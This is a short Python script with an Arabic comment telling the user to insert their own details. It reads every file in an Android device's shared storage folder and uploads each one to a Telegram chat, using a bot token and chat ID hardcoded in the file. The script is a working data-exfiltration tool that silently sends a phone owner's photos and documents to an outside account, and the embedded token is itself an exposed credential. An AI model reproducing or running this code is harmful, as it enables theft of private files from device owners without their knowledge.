import os
import requests

# 🔐 حط بياناتك هون
BOT_TOKEN = "8636277553:AAHVa-WPUKeWthK2CINgZ0EarpqHBBJ4Px4"
CHAT_ID = "7708603881"

folder = "/storage/emulated/0/"



def send_file(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, "rb") as f:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f})

for file in os.listdir(folder):
    path = os.path.join(folder, file)
    if os.path.isfile(path):
        try:
            send_file(path)
        except Exception as e:
            print("خطأ:", e)
